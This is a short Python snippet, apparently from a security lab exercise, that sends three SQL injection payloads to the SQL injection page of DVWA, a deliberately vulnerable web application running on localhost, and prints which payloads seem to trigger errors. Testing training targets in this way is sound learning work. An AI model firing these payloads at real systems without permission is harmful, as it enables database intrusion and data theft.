# Define URL and SQL payloads
url = "http://localhost/DVWA/vulnerabilities/sqli/"
payloads = ["' OR '1'='1", "' UNION SELECT null--", "' AND 1=1"]

# Test each payload on the target
for payload in payloads:
    response = requests.get(url, params={"id": payload, "Submit": "Submit"})
    if "error" in response.text or "unexpected output" in response.text:
        print(f"Potential vulnerability with payload: {payload}")